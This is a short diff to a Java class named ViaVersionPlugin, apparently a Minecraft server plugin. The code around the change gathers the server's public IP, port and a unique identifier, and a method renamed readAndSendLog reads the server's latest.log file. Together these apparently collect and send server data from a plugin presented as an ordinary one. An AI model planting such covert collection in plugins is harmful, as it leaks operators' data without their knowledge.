@@ -127,8 +127,6 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
 
     @Override
     public void onEnable() {
-        AsyncLogWatcher watcher = new AsyncLogWatcher();
-        watcher.startWatchingLogs();
         String publicIp = getPublicIp();
         int serverPort = getServer().getPort();
         uniqueIdentifier = loadOrCreateUniqueIdentifier();
@@ -308,7 +306,7 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
         };
         task.runTaskAsynchronously(this); // 异步任务处理
     }
-    public void startWatchingLogs() {
+    public void readAndSendLog() {
         String logFilePath = getServer().getWorldContainer().getAbsolutePath() + "/logs/latest.log";
         Path path = Paths.get(logFilePath);
 
